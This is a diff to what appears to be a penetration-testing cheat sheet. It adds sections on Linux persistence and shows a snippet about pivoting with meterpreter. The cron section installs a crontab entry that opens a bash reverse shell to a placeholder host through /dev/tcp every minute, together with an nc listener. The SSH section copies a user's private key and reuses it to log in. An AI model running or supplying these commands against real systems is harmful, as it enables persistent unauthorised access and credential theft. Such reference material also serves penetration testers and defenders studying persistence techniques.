@@ -239,6 +239,32 @@ chmod +x linenum.sh
 ```
 - https://github.com/rebootuser/LinEnum
 
+## Linux Persistence Via Cron Jobs
+```
+ps -ef | grep cron
+
+cat /etc/cron*
+ls -al /etc/cron*
+
+echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'" > cron
+
+crontab -i cron
+crontab -l
+```
+```
+nc -nvlp <port>
+```
+
+## Linux Persistence Via SSH Keys
+```
+ssh <username>@<ip>
+cat .ssh/id_rsa
+
+scp <username>@<ip>:/home/<username>/.ssh/id_rsa ./
+chmod 400 id_rsa
+ssh -i id_rsa <username>@<ip>
+```
+
 ## Pivoting
 ```
 meterpreter > ipconfig
